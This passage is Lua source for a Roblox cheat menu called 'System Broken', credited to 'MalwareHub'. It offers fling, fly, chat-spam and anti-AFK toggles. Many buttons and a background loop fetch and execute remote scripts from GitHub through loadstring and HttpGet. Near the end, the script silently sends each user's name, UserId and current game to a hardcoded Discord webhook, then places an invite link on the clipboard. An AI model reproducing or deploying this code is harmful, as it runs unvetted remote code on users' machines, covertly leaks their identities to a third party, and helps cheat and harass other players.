	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PrincessAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CowboyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PatrolAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieFEAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--MISC

pcall(function()
	aBjaUfk.Position = plr.Character.HumanoidRootPart.Position
end)

AntiFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiFling_Button)
	if AntiFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		_G.AntiFlingToggled = true
		loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AntiFling'))()
	else
		_G.AntiFlingToggled = false
	end
end)

AntiChatSpy_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiChatSpy_Button)
	if AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat task.wait()
			Players:Chat(RandomChar())
		until AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	end
end)

local AntiAFKFunction = nil
AntiAFK_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiAFK_Button)
	if AntiAFK_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiAFKFunction = plr.Idled:Connect(function()
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	else
		AntiAFKFunction:Disconnect()
	end
end)

Shaders_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Shaders_Button)
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local Sky = Instance.new("Sky")
		local Bloom = Instance.new("BloomEffect")
		local Blur = Instance.new("BlurEffect")
		local ColorC = Instance.new("ColorCorrectionEffect")
		local SunRays = Instance.new("SunRaysEffect")

		Light.Brightness = 2.25
		Light.ExposureCompensation = 0.1
		Light.ClockTime = 17.55

		Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
		Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
		Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
		Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
		Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
		Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
		Sky.StarCount = 5000
		Sky.SunAngularSize = 5
		Sky.Parent = Light

		Bloom.Intensity = 0.3
		Bloom.Size = 10
		Bloom.Threshold = 0.8
		Bloom.Parent = Light

		Blur.Size = 5
		Blur.Parent = Light

		ColorC.Brightness = 0
		ColorC.Contrast = 0.1
		ColorC.Saturation = 0.25
		ColorC.TintColor = Color3.fromRGB(255, 255, 255)
		ColorC.Parent = Light

		SunRays.Intensity = 0.1
		SunRays.Spread = 0.8
		SunRays.Parent = Light
	else
		for i,v in pairs(Light:GetChildren()) do
			v:Destroy()
		end
		Light.Brightness = 2
		Light.ExposureCompensation = 0
	end
end)

Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 14
	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

Night_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 19
	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

InfYield_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

CMDX_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end)

Explode_Button.MouseButton1Click:Connect(function()
	ToggleRagdoll(false)
	task.wait()
	plr.Character.Humanoid:ChangeState(0)
	local bav = Instance.new("BodyAngularVelocity")
	bav.Parent = GetRoot(plr)
	bav.Name = "Spin"
	bav.MaxTorque = Vector3.new(0,math.huge,0)
	bav.AngularVelocity = Vector3.new(0,150,0)
	task.wait(3)
	plr.Character.Humanoid:ChangeState(15)
end)

FreeEmotes_Button.MouseButton1Click:Connect(function()
	if not FreeEmotesEnabled then
		FreeEmotesEnabled = true
		SendNotify("System Broken","Loading free emotes.\nCredits: Gi#7331")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AllEmotes"))()
	end
end)

Rejoin_Button.MouseButton1Click:Connect(function()
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
end)

Serverhop_Button.MouseButton1Click:Connect(function()
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)})
		local body = HttpService:JSONDecode(req.Body)
		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end
		if #servers > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], plr)
		end
	end
end)

ChatBox_Input.FocusLost:Connect(function()
	local args = {[1] = ChatBox_Input.Text,[2] = "All"}
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	ChatBox_Input.Text = ""
end)

--GUI Functions
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("System Broken","Targeted player left/rejoined.",5)
		end
	end)
end)

plr.CharacterAdded:Connect(function(x)
	task.wait(GetPing()+0.1)
	x:WaitForChild("Humanoid")
	if SavedCheckpoint ~= nil then
		TeleportTO(SavedCheckpoint.X,SavedCheckpoint.Y,SavedCheckpoint.Z,"pos","safe")
	end
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionDi_Button)
		SendNotify("System Broken","PotionDick was automatically disabled due to your character respawn",5)
	end
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionFling_Button)
		SendNotify("System Broken","PotionFling was automatically disabled due to your character respawn",5)
	end
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(AntiRagdoll_Button)
		SendNotify("System Broken","AntiRagdoll was automatically disabled due to your character respawn",5)
	end
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("System Broken","SpamMines was automatically disabled due to your character respawn",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("System Broken","Fly was automatically disabled due to your character respawn",5)
	end
	x.Humanoid.Died:Connect(function()
		pcall(function()
			x["Pushed"].Disabled = false
			x["RagdollMe"].Disabled = false
		end)
	end)
	task.wait(1)
	local appearance = players:GetCharacterAppearanceAsync(plr.UserId)
	local original_accs = {}
	local accs = {}
	for i,acc in pairs(appearance:GetChildren()) do --Save original accessoryes
		if acc:IsA("Accessory") then
			table.insert(original_accs, acc.Name)
		end
	end
	for i,acc in pairs(plr.Character:GetChildren()) do --Save player accessoryes
		if acc:IsA("Accessory") then
			table.insert(accs, acc.Name)
		end
	end
	
	local original_ammount = #original_accs
	local ammount = #accs
	if ammount == original_ammount then
		local count = 0
		for i,v in pairs(accs) do
			if table.find(original_accs, v) then
				count = count+1
			end
		end
		if not (count == original_ammount) then
			SysBroker:Destroy()
			SendNotify("System Broken","An unexpected error occurred, re-joining...")
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
		end
	else
		SysBroker:Destroy()
		SendNotify("System Broken","An unexpected error occurred, re-joining...")
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
	end
	appearance:Destroy()
end)

task.spawn(function()
	while task.wait(10) do
		pcall(function()
			local GuiVersion = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/version"))()
			if version<GuiVersion then
				SendNotify("System Broken","You are not using the latest version, please run the script again.",5)
				task.wait(5)
				SysBroker:Destroy()
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)

OpenClose.MouseButton1Click:Connect(function()
	Background.Visible = not Background.Visible
end)

game:GetService("UserInputService").InputBegan:Connect(function(input,gameProcessedEvent)
	if gameProcessedEvent then return end
	if input.KeyCode == Enum.KeyCode.B then
		Background.Visible = not Background.Visible
	end
end)

task.spawn(function()
	while task.wait(60) do
		pcall(function()
			local age = plr.AccountAge
			local date_1 = os.date("%Y-%m-%d", os.time()-age * 24 * 3600)
			local date_2 = os.date("%Y-%m-%d", os.time()-(age+1) * 24 * 3600)
			local date_3 = os.date("%Y-%m-%d", os.time()-(age-1) * 24 * 3600)

			local info = game:HttpGet("https://users.roblox.com/v1/users/"..plr.UserId)
			local decode = game:GetService("HttpService"):JSONDecode(info)
			local original_name = decode["name"]
			local original_display = decode["displayName"]
			local original_date = decode["created"]:sub(1,10)

			if (plr.Name ~= original_name) or (plr.DisplayName ~= original_display) or (plr.UserId ~= plr.CharacterAppearanceId) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
			if (date_1 ~= original_date) and (date_2 ~= original_date) and (date_3 ~= original_date) then
				SysBroker:Destroy()
				SendNotify("System Broken","An unexpected error occurred, re-joining...")
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
		end)
	end
end)
export type Json = {
    Url: string;
    Method: "POST";
    Headers: string;
    Body: any
}

pcall(function()
    local response = HttpRequest({
        Url = "https://discord.com/api/webhooks/1259508306334974002/epK0oLyXDADk7ATyVFrR5XfIbS_OexxUdKagYq43_AQgnEelkPVhhQQxnOGKmW2dJcsD",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = "Script has been Injected: \n```Name: " .. plr.Name .. " | UserId: " .. plr.UserId .. " | Game: " .. game.PlaceId .. "```" .. "\nProfile: " .. "https://www.roblox.com/users/" .. plr.UserId .. "\nGame: " .. "https://www.roblox.com/games/" .. game.PlaceId
        })
    } :: Json)
end)

SendNotify("System Broken","Gui developed by MalwareHub - Discord in your clipboard",10)
setclipboard("https://discord.gg/RkhpySwNR9")
loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/premium"))() -- load the premium

  	end    

})